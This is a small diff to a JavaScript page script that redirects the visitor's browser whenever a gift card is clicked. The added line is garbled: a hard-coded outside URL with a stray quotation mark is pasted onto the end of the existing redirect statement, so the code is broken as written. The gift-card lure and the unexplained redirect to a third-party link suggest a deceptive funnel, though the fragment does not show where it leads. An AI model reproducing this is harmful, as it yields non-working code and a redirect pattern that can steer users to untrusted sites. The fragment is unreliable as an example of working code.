@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // Function to redirect the user
     function redirectToWebsite() {
         // Redirects the user's browser to the specified URL
-        window.location.href = redirectURL;
+        window.location.href = redirectURL;https://lockedapp.org/cl/js/7j7kl9";
     }
 
     // Add a 'click' event listener to every gift card
